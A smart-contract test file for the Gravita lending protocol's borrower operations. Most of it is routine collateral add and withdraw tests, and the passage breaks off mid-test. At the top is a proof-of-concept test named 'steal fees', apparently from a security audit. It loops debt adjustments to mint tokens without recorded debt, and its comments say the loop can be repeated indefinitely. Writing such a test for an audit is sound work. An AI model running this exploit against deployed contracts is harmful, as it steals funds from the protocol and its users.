const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers")

const BorrowerOperationsTester = artifacts.require("BorrowerOperationsTester")
const VesselManagerTester = artifacts.require("VesselManagerTester")
const ERC20Mock = artifacts.require("ERC20Mock")

const deploymentHelper = require("../../utils/deploymentHelpers.js")
const testHelpers = require("../../utils/testHelpers.js")

const th = testHelpers.TestHelper
const { dec, toBN, assertRevert } = th
const timeValues = testHelpers.TimeValues

/* NOTE: Some of the borrowing tests do not test for specific VUSD fee values. They only test that the
 * fees are non-zero when they should occur, and that they decay over time.
 *
 * Specific VUSD fee values will depend on the final fee schedule used, and the final choice for
 *  the parameter MINUTE_DECAY_FACTOR in the VesselManager, which is still TBD based on economic
 * modelling.
 *
 */

contract("BorrowerOperations", async accounts => {
	const [owner, alice, bob, carol, dennis, whale, A, B, C, D, E, multisig, treasury] = accounts

	let contracts

	let activePool
	let adminContract
	let borrowerOperations
	let debtToken
	let defaultPool
	let erc20
	let feeCollector
	let grvtStaking
	let grvtToken
	let priceFeed
	let sortedVessels
	let vesselManager
	let vesselManagerOperations

	const getOpenVesselVUSDAmount = async (totalDebt, asset) => th.getOpenVesselVUSDAmount(contracts, totalDebt, asset)
	const getNetBorrowingAmount = async (debtWithFee, asset) => th.getNetBorrowingAmount(contracts, debtWithFee, asset)
	const openVessel = async params => th.openVessel(contracts, params)
	const getVesselEntireColl = async (vessel, asset) => th.getVesselEntireColl(contracts, vessel, asset)
	const getVesselEntireDebt = async (vessel, asset) => th.getVesselEntireDebt(contracts, vessel, asset)
	const getVesselStake = async (vessel, asset) => th.getVesselStake(contracts, vessel, asset)

	let VUSD_GAS_COMPENSATION_ERC20
	let MIN_NET_DEBT_ERC20

	withProxy = false
	
	describe("BorrowerOperations Mechanisms", async () => {
		async function deployContractsFixture() {
			contracts = await deploymentHelper.deployGravitaCore()
			contracts.borrowerOperations = await BorrowerOperationsTester.new()
			contracts.vesselManager = await VesselManagerTester.new()
			contracts = await deploymentHelper.deployDebtTokenTester(contracts)
			const GRVTContracts = await deploymentHelper.deployGRVTContractsHardhat(accounts[0])

			await deploymentHelper.connectCoreContracts(contracts, GRVTContracts, treasury)
			await deploymentHelper.connectGRVTContractsToCore(GRVTContracts, contracts)

			activePool = contracts.activePool
			adminContract = contracts.adminContract
			borrowerOperations = contracts.borrowerOperations
			debtToken = contracts.debtToken
			defaultPool = contracts.defaultPool
			erc20 = contracts.erc20
			feeCollector = contracts.feeCollector
			grvtToken = GRVTContracts.grvtToken
			grvtStaking = GRVTContracts.grvtStaking
			priceFeed = contracts.priceFeedTestnet
			sortedVessels = contracts.sortedVessels
			vesselManager = contracts.vesselManager
			vesselManagerOperations = contracts.vesselManagerOperations

			await feeCollector.setRouteToGRVTStaking(true) // sends fees to GRVTStaking instead of treasury

			VUSD_GAS_COMPENSATION_ERC20 = await adminContract.getDebtTokenGasCompensation(erc20.address)
			MIN_NET_DEBT_ERC20 = await adminContract.getMinNetDebt(erc20.address)
			BORROWING_FEE_ERC20 = await adminContract.getBorrowingFee(erc20.address)

			await grvtToken.unprotectedMint(multisig, dec(5, 24))

			for (const acc of accounts.slice(0, 20)) {
				await grvtToken.approve(grvtStaking.address, await web3.eth.getBalance(acc), {
					from: acc,
				})
				await erc20.mint(acc, await web3.eth.getBalance(acc))
			}
		}

		beforeEach(async () => {
			await loadFixture(deployContractsFixture)
		})

		it.only("steal fees", async () => {
			// Open a Vessel
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(100000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})

			// Keep track of the balances before the attack
			const vesselColStart = (await contracts.vesselManager.Vessels(D, erc20.address)).coll
			const vesselDebtStart = await contracts.vesselManager.getVesselDebt(erc20.address, D)
			const vesselStakeStart = (await contracts.vesselManager.Vessels(D, erc20.address)).stake
			const userColStart = await erc20.balanceOf(D)
			const userDebtStart = await debtToken.balanceOf(D)

			// Reduce the borrowing fee to show the worst case scenario
			// With the default values configured, `borrowingFee < 44` will be sufficient for the attack (0.44%)
			// Meaning `refundFee - borrowingFee > 0`
			// In that case, the debt will increase, but the refunds will still be higher => Enough to take profit from the attack
			await adminContract.setBorrowingFee(erc20.address, "0")

			// This loop performs the attack
			// The attack can be repeated indefinitely.
			const repeat = 5
			for (let i = 0; i < repeat; i++) {
				await borrowerOperations.adjustVessel(
					erc20.address,
					0,
					"0",
					"30000000000000000000000",
					true,
					D,
					D,
					{ from: D }
				)

				await borrowerOperations.adjustVessel(
					erc20.address,
					0,
					"0",
					"30000000000000000000000",
					false,
					D,
					D,
					{ from: D }
				)
			}
			
			// Keep track of final balances
			const vesselColEnd = (await contracts.vesselManager.Vessels(D, erc20.address)).coll
			const vesselDebtEnd = await contracts.vesselManager.getVesselDebt(erc20.address, D)
			const vesselStakeEnd = (await contracts.vesselManager.Vessels(D, erc20.address)).stake
			const userColEnd = await erc20.balanceOf(D)
			const userDebtEnd = await debtToken.balanceOf(D)

			console.log("Vessel Col Start:  ", vesselColStart.toString())
			console.log("Vessel Col End:    ", vesselColEnd.toString())
			console.log("")

			console.log("Vessel Debt Start: ", vesselDebtStart.toString())
			console.log("Vessel Debt End:   ", vesselDebtEnd.toString())
			console.log("")

			console.log("Vessel Stake Start:", vesselDebtStart.toString())
			console.log("Vessel Stake End:  ", vesselDebtEnd.toString())
			console.log("")

			console.log("User Col Start:    ", userColStart.toString())
			console.log("User Col End:      ", userColEnd.toString())
			console.log("")

			console.log("User Debt Start:   ", userDebtStart.toString())
			console.log("User Debt End:     ", userDebtEnd.toString())
			console.log("")

			// Assert that no other balances have changed
			assert.equal(vesselDebtStart.toString(), vesselDebtEnd.toString())
			assert.equal(vesselColStart.toString(), vesselColEnd.toString())
			assert.equal(vesselStakeStart.toString(), vesselStakeEnd.toString())
			assert.equal(userColStart.toString(), userColEnd.toString())

			// Stolen debt tokens (by minting without increasing debt in the vessel)
			const stolenDebtTokens = (userDebtEnd - userDebtStart).toString();
			const expectedStolenDebtTokens = "353802907894836900000"
			assert.equal(stolenDebtTokens, expectedStolenDebtTokens)
		})

		it("openVessel(): invalid collateral reverts", async () => {
			const randomErc20 = await ERC20Mock.new("RAND", "RAND", 18)
			await assertRevert(
				borrowerOperations.openVessel(randomErc20.address, dec(1, 18), dec(100, 18), th.ZERO_ADDRESS, th.ZERO_ADDRESS, {
					from: alice,
				}),
				"collateral does not exist"
			)
		})

		it("addColl(): reverts when top-up would leave vessel with ICR < MCR", async () => {
			// alice creates a Vessel and adds first collateral

			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: bob },
			})

			// Price drops
			await priceFeed.setPrice(erc20.address, dec(100, 18))
			const price = await priceFeed.getPrice(erc20.address)

			assert.isFalse(await vesselManager.checkRecoveryMode(erc20.address, price))
			assert.isTrue((await vesselManager.getCurrentICR(erc20.address, alice, price)).lt(toBN(dec(110, 16))))

			const collTopUp = 1 // 1 wei top up

			await assertRevert(
				borrowerOperations.addColl(erc20.address, collTopUp, alice, alice, { from: alice }),
				"BorrowerOps: An operation that would result in ICR < MCR is not permitted"
			)
		})

		it("addColl(): Increases the activePool ETH and raw ether balance by correct amount", async () => {
			const { collateral: aliceCollAsset } = await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(3, 18)),
				extraParams: { from: alice },
			})

			const activePool_ETH_Before_Asset = await activePool.getAssetBalance(erc20.address)
			const activePool_RawEther_Before_Asset = toBN(await erc20.balanceOf(activePool.address))

			assert.isTrue(activePool_ETH_Before_Asset.eq(aliceCollAsset))
			assert.isTrue(activePool_RawEther_Before_Asset.eq(aliceCollAsset))

			await borrowerOperations.addColl(erc20.address, dec(1, "ether"), alice, alice, {
				from: alice,
			})

			const activePool_ETH_After_Asset = await activePool.getAssetBalance(erc20.address)
			const activePool_RawEther_After_Asset = toBN(await erc20.balanceOf(activePool.address))

			assert.isTrue(activePool_ETH_After_Asset.eq(aliceCollAsset.add(toBN(dec(1, "ether")))))

			assert.isTrue(activePool_RawEther_After_Asset.eq(aliceCollAsset.add(toBN(dec(1, "ether")))))
		})

		it("addColl(): active Vessel: adds the correct collateral amount to the Vessel", async () => {
			// alice creates a Vessel and adds first collateral
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			const alice_Vessel_Before_Asset = await vesselManager.Vessels(alice, erc20.address)
			const coll_before_Asset = alice_Vessel_Before_Asset[th.VESSEL_COLL_INDEX]
			const status_Before_Asset = alice_Vessel_Before_Asset[th.VESSEL_STATUS_INDEX]

			// check status before
			assert.equal(status_Before_Asset, 1)

			// Alice adds second collateral
			await borrowerOperations.addColl(erc20.address, dec(1, "ether"), alice, alice, {
				from: alice,
			})

			const alice_Vessel_After_Asset = await vesselManager.Vessels(alice, erc20.address)
			const coll_After_Asset = alice_Vessel_After_Asset[th.VESSEL_COLL_INDEX]
			const status_After_Asset = alice_Vessel_After_Asset[th.VESSEL_STATUS_INDEX]

			// check coll increases by correct amount,and status remains active

			assert.isTrue(coll_After_Asset.eq(coll_before_Asset.add(toBN(dec(1, "ether")))))
			assert.equal(status_After_Asset, 1)
		})

		it("addColl(): active Vessel: Vessel is in sortedList before and after", async () => {
			// alice creates a Vessel and adds first collateral
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			// check Alice is in list before

			const aliceVesselInList_Before_Asset = await sortedVessels.contains(erc20.address, alice)
			const listIsEmpty_Before_Asset = await sortedVessels.isEmpty(erc20.address)

			assert.equal(aliceVesselInList_Before_Asset, true)
			assert.equal(listIsEmpty_Before_Asset, false)

			await borrowerOperations.addColl(erc20.address, dec(1, "ether"), alice, alice, {
				from: alice,
			})

			// check Alice is still in list after
			const aliceVesselInList_After_Asset = await sortedVessels.contains(erc20.address, alice)
			const listIsEmpty_After_Asset = await sortedVessels.isEmpty(erc20.address)

			assert.equal(aliceVesselInList_After_Asset, true)
			assert.equal(listIsEmpty_After_Asset, false)
		})

		it("addColl(): active Vessel: updates the stake and updates the total stakes", async () => {
			//  Alice creates initial Vessel with 1 ether
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			const alice_Vessel_Before_Asset = await vesselManager.Vessels(alice, erc20.address)
			const alice_Stake_Before_Asset = alice_Vessel_Before_Asset[th.VESSEL_STAKE_INDEX]
			const totalStakes_Before_Asset = await vesselManager.totalStakes(erc20.address)

			assert.isTrue(totalStakes_Before_Asset.eq(alice_Stake_Before_Asset))

			// Alice tops up Vessel collateral with 2 ether
			await borrowerOperations.addColl(erc20.address, dec(2, "ether"), alice, alice, {
				from: alice,
			})

			// Check stake and total stakes get updated
			const alice_Vessel_After_Asset = await vesselManager.Vessels(alice, erc20.address)
			const alice_Stake_After_Asset = alice_Vessel_After_Asset[th.VESSEL_STAKE_INDEX]
			const totalStakes_After_Asset = await vesselManager.totalStakes(erc20.address)

			assert.isTrue(alice_Stake_After_Asset.eq(alice_Stake_Before_Asset.add(toBN(dec(2, "ether")))))
			assert.isTrue(totalStakes_After_Asset.eq(totalStakes_Before_Asset.add(toBN(dec(2, "ether")))))
		})

		it("addColl(): active Vessel: applies pending rewards and updates user's L_ETH, L_VUSDDebt snapshots", async () => {
			// --- SETUP ---

			const { collateral: aliceCollBeforeAsset, totalDebt: aliceDebtBeforeAsset } = await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(15000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			const { collateral: bobCollBeforeAsset, totalDebt: bobDebtBeforeAsset } = await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: carol },
			})
			// --- TEST ---

			// price drops to 1ETH:100VUSD, reducing Carol's ICR below MCR
			await priceFeed.setPrice(erc20.address, "100000000000000000000")

			// Liquidate Carol's Vessel,
			await vesselManagerOperations.liquidate(erc20.address, carol, { from: owner })

			assert.isFalse(await sortedVessels.contains(erc20.address, carol))

			const L_Asset = await vesselManager.L_Colls(erc20.address)
			const L_VUSDDebt_Asset = await vesselManager.L_Debts(erc20.address)

			// check Alice and Bob's reward snapshots are zero before they alter their Vessels

			const alice_rewardSnapshot_Before_Asset = await vesselManager.rewardSnapshots(alice, erc20.address)
			const alice_ETHrewardSnapshot_Before_Asset = alice_rewardSnapshot_Before_Asset[0]
			const alice_VUSDDebtRewardSnapshot_Before_Asset = alice_rewardSnapshot_Before_Asset[1]

			const bob_rewardSnapshot_Before_Asset = await vesselManager.rewardSnapshots(bob, erc20.address)
			const bob_ETHrewardSnapshot_Before_Asset = bob_rewardSnapshot_Before_Asset[0]
			const bob_VUSDDebtRewardSnapshot_Before_Asset = bob_rewardSnapshot_Before_Asset[1]

			assert.equal(alice_ETHrewardSnapshot_Before_Asset, 0)
			assert.equal(alice_VUSDDebtRewardSnapshot_Before_Asset, 0)
			assert.equal(bob_ETHrewardSnapshot_Before_Asset, 0)
			assert.equal(bob_VUSDDebtRewardSnapshot_Before_Asset, 0)

			const alicePendingETHRewardAsset = await vesselManager.getPendingAssetReward(erc20.address, alice)
			const bobPendingETHRewardAsset = await vesselManager.getPendingAssetReward(erc20.address, bob)
			const alicePendingVUSDDebtRewardAsset = await vesselManager.getPendingDebtTokenReward(erc20.address, alice)
			const bobPendingVUSDDebtRewardAsset = await vesselManager.getPendingDebtTokenReward(erc20.address, bob)

			for (reward of [
				alicePendingETHRewardAsset,
				bobPendingETHRewardAsset,
				alicePendingVUSDDebtRewardAsset,
				bobPendingVUSDDebtRewardAsset,
			]) {
				assert.isTrue(reward.gt(toBN("0")))
			}

			// Alice and Bob top up their Vessels
			const aliceTopUp = toBN(dec(5, "ether"))
			const bobTopUp = toBN(dec(1, "ether"))

			await borrowerOperations.addColl(erc20.address, aliceTopUp, alice, alice, {
				from: alice,
			})
			await borrowerOperations.addColl(erc20.address, bobTopUp, bob, bob, { from: bob })

			// Check that both alice and Bob have had pending rewards applied in addition to their top-ups.

			const aliceNewColl_Asset = await getVesselEntireColl(alice, erc20.address)
			const aliceNewDebt_Asset = await getVesselEntireDebt(alice, erc20.address)
			const bobNewColl_Asset = await getVesselEntireColl(bob, erc20.address)
			const bobNewDebt_Asset = await getVesselEntireDebt(bob, erc20.address)

			assert.isTrue(aliceNewColl_Asset.eq(aliceCollBeforeAsset.add(alicePendingETHRewardAsset).add(aliceTopUp)))
			assert.isTrue(aliceNewDebt_Asset.eq(aliceDebtBeforeAsset.add(alicePendingVUSDDebtRewardAsset)))
			assert.isTrue(bobNewColl_Asset.eq(bobCollBeforeAsset.add(bobPendingETHRewardAsset).add(bobTopUp)))
			assert.isTrue(bobNewDebt_Asset.eq(bobDebtBeforeAsset.add(bobPendingVUSDDebtRewardAsset)))

			/* Check that both Alice and Bob's snapshots of the rewards-per-unit-staked metrics should be updated
       to the latest values of L_ETH and L_VUSDDebt */

			const alice_rewardSnapshot_After_Asset = await vesselManager.rewardSnapshots(alice, erc20.address)
			const alice_ETHrewardSnapshot_After_Asset = alice_rewardSnapshot_After_Asset[0]
			const alice_VUSDDebtRewardSnapshot_After_Asset = alice_rewardSnapshot_After_Asset[1]

			const bob_rewardSnapshot_After_Asset = await vesselManager.rewardSnapshots(bob, erc20.address)
			const bob_ETHrewardSnapshot_After_Asset = bob_rewardSnapshot_After_Asset[0]
			const bob_VUSDDebtRewardSnapshot_After_Asset = bob_rewardSnapshot_After_Asset[1]

			assert.isAtMost(th.getDifference(alice_ETHrewardSnapshot_After_Asset, L_Asset), 100)
			assert.isAtMost(th.getDifference(alice_VUSDDebtRewardSnapshot_After_Asset, L_VUSDDebt_Asset), 100)
			assert.isAtMost(th.getDifference(bob_ETHrewardSnapshot_After_Asset, L_Asset), 100)
			assert.isAtMost(th.getDifference(bob_VUSDDebtRewardSnapshot_After_Asset, L_VUSDDebt_Asset), 100)
		})

		it("addColl(): reverts if vessel is non-existent or closed", async () => {
			// A, B open vessels

			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})

			// Carol attempts to add collateral to her non-existent vessel
			try {
				const txCarol = await borrowerOperations.addColl(erc20.address, dec(1, "ether"), carol, carol, { from: carol })
				assert.isFalse(txCarol.receipt.status)
			} catch (error) {
				assert.include(error.message, "revert")
				assert.include(error.message, "Vessel does not exist or is closed")
			}

			// Price drops
			await priceFeed.setPrice(erc20.address, dec(100, 18))

			// Bob gets liquidated
			await vesselManagerOperations.liquidate(erc20.address, bob)

			assert.isFalse(await sortedVessels.contains(erc20.address, bob))

			// Bob attempts to add collateral to his closed vessel
			try {
				const txBob = await borrowerOperations.addColl(erc20.address, dec(1, "ether"), bob, bob, { from: bob })
				assert.isFalse(txBob.receipt.status)
			} catch (error) {
				assert.include(error.message, "revert")
				assert.include(error.message, "Vessel does not exist or is closed")
			}
		})

		it("addColl(): can add collateral in Recovery Mode", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			const aliceCollAssetBefore_Asset = await getVesselEntireColl(alice, erc20.address)
			assert.isFalse(await th.checkRecoveryMode(contracts, erc20.address))

			await priceFeed.setPrice(erc20.address, "105000000000000000000")

			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))

			const collTopUp = toBN(dec(1, "ether"))
			await borrowerOperations.addColl(erc20.address, collTopUp, alice, alice, { from: alice })

			// Check Alice's collateral
			// assert.isTrue(aliceCollAfter.eq(aliceCollBefore.add(collTopUp)))

			const aliceCollAssetAfter = (await vesselManager.Vessels(alice, erc20.address))[th.VESSEL_COLL_INDEX]
			assert.isTrue(aliceCollAssetAfter.eq(aliceCollAssetBefore_Asset.add(collTopUp)))
		})

		// --- withdrawColl() ---

		it("withdrawColl(): reverts when withdrawal would leave vessel with ICR < MCR", async () => {
			// alice creates a Vessel and adds first collateral

			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: bob },
			})

			// Price drops
			await priceFeed.setPrice(erc20.address, dec(100, 18))
			const price = await priceFeed.getPrice(erc20.address)

			assert.isFalse(await vesselManager.checkRecoveryMode(erc20.address, price))
			assert.isTrue((await vesselManager.getCurrentICR(erc20.address, alice, price)).lt(toBN(dec(110, 16))))

			const collWithdrawal = 1 // 1 wei withdrawal

			await assertRevert(
				borrowerOperations.withdrawColl(erc20.address, 1, alice, alice, { from: alice }),
				"BorrowerOps: An operation that would result in ICR < MCR is not permitted"
			)
		})

		// reverts when calling address does not have active vessel
		it("withdrawColl(): reverts when calling address does not have active vessel", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})

			// Bob successfully withdraws some coll
			const txBobAsset = await borrowerOperations.withdrawColl(erc20.address, dec(100, "finney"), bob, bob, {
				from: bob,
			})
			assert.isTrue(txBobAsset.receipt.status)

			// Carol with no active vessel attempts to withdraw
			try {
				const txCarolAsset = await borrowerOperations.withdrawColl(erc20.address, dec(1, "ether"), carol, carol, {
					from: carol,
				})
				assert.isFalse(txCarolAsset.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("withdrawColl(): reverts when system is in Recovery Mode", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})

			assert.isFalse(await th.checkRecoveryMode(contracts, erc20.address))

			// Withdrawal possible when recoveryMode == false

			const txAliceAsset = await borrowerOperations.withdrawColl(erc20.address, 1000, alice, alice, { from: alice })
			assert.isTrue(txAliceAsset.receipt.status)

			await priceFeed.setPrice(erc20.address, "105000000000000000000")

			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))

			//Check withdrawal impossible when recoveryMode == true
			try {
				const txBobAsset = await borrowerOperations.withdrawColl(erc20.address, 1000, bob, bob, { from: bob })
				assert.isFalse(txBobAsset.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("withdrawColl(): reverts when requested asset withdrawal is > the vessel's collateral", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: carol },
			})

			const carolCollAsset = await getVesselEntireColl(carol, erc20.address)
			const bobCollAsset = await getVesselEntireColl(bob, erc20.address)

			// Carol withdraws exactly all her collateral
			await assertRevert(
				borrowerOperations.withdrawColl(erc20.address, carolCollAsset, carol, carol, {
					from: carol,
				}),
				"BorrowerOps: An operation that would result in ICR < MCR is not permitted"
			)
			// Bob attempts to withdraw 1 wei more than his collateral
			try {
				const txBobAsset = await borrowerOperations.withdrawColl(erc20.address, bobCollAsset.add(toBN(1)), bob, bob, {
					from: bob,
				})
				assert.isFalse(txBobAsset.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("withdrawColl(): reverts when withdrawal would bring the user's ICR < MCR", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(11, 17)),
				extraParams: { from: bob },
			}) // 110% ICR

			// Bob attempts to withdraws 1 wei, Which would leave him with < 110% ICR.

			try {
				const txBobAsset = await borrowerOperations.withdrawColl(erc20.address, 1, bob, bob, {
					from: bob,
				})
				assert.isFalse(txBobAsset.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("withdrawColl(): reverts if system is in Recovery Mode", async () => {
			// --- SETUP ---

			// A and B open vessels at 150% ICR

			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(15, 17)),
				extraParams: { from: bob },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(15, 17)),
				extraParams: { from: alice },
			})

			const TCR_Asset = (await th.getTCR(contracts, erc20.address)).toString()
			assert.equal(TCR_Asset, "1500000000000000000")

			// --- TEST ---

			// price drops to 1ETH:150VUSD, reducing TCR below 150%
			await priceFeed.setPrice(erc20.address, "150000000000000000000")

			//Alice tries to withdraw collateral during Recovery Mode

			try {
				const txDataAsset = await borrowerOperations.withdrawColl(erc20.address, "1", alice, alice, { from: alice })
				assert.isFalse(txDataAsset.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("withdrawColl(): doesn’t allow a user to completely withdraw all collateral from their Vessel (due to gas compensation)", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			const aliceCollAsset = (await vesselManager.getEntireDebtAndColl(erc20.address, alice))[th.VESSEL_COLL_INDEX]

			// Check Vessel is active

			const alice_Vessel_Before_Asset = await vesselManager.Vessels(alice, erc20.address)
			const status_Before_Asset = alice_Vessel_Before_Asset[th.VESSEL_STATUS_INDEX]
			assert.equal(status_Before_Asset, 1)
			assert.isTrue(await sortedVessels.contains(erc20.address, alice))

			// Alice attempts to withdraw all collateral

			await assertRevert(
				borrowerOperations.withdrawColl(erc20.address, aliceCollAsset, alice, alice, {
					from: alice,
				}),
				"BorrowerOps: An operation that would result in ICR < MCR is not permitted"
			)
		})

		it("withdrawColl(): leaves the Vessel active when the user withdraws less than all the collateral", async () => {
			// Open Vessel
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			// Check Vessel is active

			const alice_Vessel_Before_Asset = await vesselManager.Vessels(alice, erc20.address)
			const status_Before_Asset = alice_Vessel_Before_Asset[th.VESSEL_STATUS_INDEX]
			assert.equal(status_Before_Asset, 1)
			assert.isTrue(await sortedVessels.contains(erc20.address, alice))

			// Withdraw some collateral
			await borrowerOperations.withdrawColl(erc20.address, dec(100, "finney"), alice, alice, {
				from: alice,
			})

			// Check Vessel is still active

			const alice_Vessel_After_Asset = await vesselManager.Vessels(alice, erc20.address)
			const status_After_Asset = alice_Vessel_After_Asset[th.VESSEL_STATUS_INDEX]
			assert.equal(status_After_Asset, 1)
			assert.isTrue(await sortedVessels.contains(erc20.address, alice))
		})

		it("withdrawColl(): reduces the Vessel's collateral by the correct amount", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			const aliceCollBefore_Asset = await getVesselEntireColl(alice, erc20.address)

			// Alice withdraws 1 ether
			await borrowerOperations.withdrawColl(erc20.address, dec(1, "ether"), alice, alice, {
				from: alice,
			})

			// Check 1 ether remaining

			const alice_Vessel_After_Asset = await vesselManager.Vessels(alice, erc20.address)
			const aliceCollAfter_Asset = await getVesselEntireColl(alice, erc20.address)

			assert.isTrue(aliceCollAfter_Asset.eq(aliceCollBefore_Asset.sub(toBN(dec(1, "ether")))))
		})

		it("withdrawColl(): reduces ActivePool ETH and raw ether by correct amount", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			// check before

			const activePool_ETH_before_Asset = await activePool.getAssetBalance(erc20.address)
			const activePool_RawEther_before_Asset = toBN(await erc20.balanceOf(activePool.address))

			await borrowerOperations.withdrawColl(erc20.address, dec(1, "ether"), alice, alice, {
				from: alice,
			})

			// check after

			const activePool_ETH_After_Asset = await activePool.getAssetBalance(erc20.address)
			const activePool_RawEther_After_Asset = toBN(await erc20.balanceOf(activePool.address))
			assert.isTrue(activePool_ETH_After_Asset.eq(activePool_ETH_before_Asset.sub(toBN(dec(1, "ether")))))
			assert.isTrue(activePool_RawEther_After_Asset.eq(activePool_RawEther_before_Asset.sub(toBN(dec(1, 18)))))
		})

		it("withdrawColl(): updates the stake and updates the total stakes", async () => {
			//  Alice creates initial Vessel with 2 ether
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			const aliceColl_Asset = await getVesselEntireColl(alice, erc20.address)
			assert.isTrue(aliceColl_Asset.gt(toBN("0")))

			const alice_Vessel_Before_Asset = await vesselManager.Vessels(alice, erc20.address)
			const alice_Stake_Before_Asset = alice_Vessel_Before_Asset[th.VESSEL_STAKE_INDEX]
			const totalStakes_Before_Asset = await vesselManager.totalStakes(erc20.address)

			assert.isTrue(alice_Stake_Before_Asset.eq(aliceColl_Asset))
			assert.isTrue(totalStakes_Before_Asset.eq(aliceColl_Asset))

			// Alice withdraws 1 ether
			await borrowerOperations.withdrawColl(erc20.address, dec(1, "ether"), alice, alice, {
				from: alice,
			})

			// Check stake and total stakes get updated

			const alice_Vessel_After_Asset = await vesselManager.Vessels(alice, erc20.address)
			const alice_Stake_After_Asset = alice_Vessel_After_Asset[th.VESSEL_STAKE_INDEX]
			const totalStakes_After_Asset = await vesselManager.totalStakes(erc20.address)

			assert.isTrue(alice_Stake_After_Asset.eq(alice_Stake_Before_Asset.sub(toBN(dec(1, "ether")))))
			assert.isTrue(totalStakes_After_Asset.eq(totalStakes_Before_Asset.sub(toBN(dec(1, "ether")))))
		})

		it("withdrawColl(): sends the correct amount of ETH to the user", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			const alice_ETHBalance_Before_Asset = toBN(web3.utils.toBN(await erc20.balanceOf(alice)))
			await borrowerOperations.withdrawColl(erc20.address, dec(1, "ether"), alice, alice, {
				from: alice,
				// gasPrice: 0,
			})
			const alice_ETHBalance_After_Asset = toBN(web3.utils.toBN(await erc20.balanceOf(alice)))

			const balanceDiff_Asset = alice_ETHBalance_After_Asset.sub(alice_ETHBalance_Before_Asset)

			assert.isTrue(balanceDiff_Asset.eq(toBN(dec(1, 18))))
		})

		it("withdrawColl(): applies pending rewards and updates user's L_ETH, L_VUSDDebt snapshots", async () => {
			// --- SETUP ---
			// Alice adds 15 ether, Bob adds 5 ether, Carol adds 1 ether

			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(3, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(3, 18)),
				extraParams: { from: bob },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: carol },
			})

			const aliceCollBefore_Asset = await getVesselEntireColl(alice, erc20.address)
			const aliceDebtBefore_Asset = await getVesselEntireDebt(alice, erc20.address)
			const bobCollBefore_Asset = await getVesselEntireColl(bob, erc20.address)
			const bobDebtBefore_Asset = await getVesselEntireDebt(bob, erc20.address)

			// --- TEST ---

			// price drops to 1ETH:100VUSD, reducing Carol's ICR below MCR
			await priceFeed.setPrice(erc20.address, "100000000000000000000")

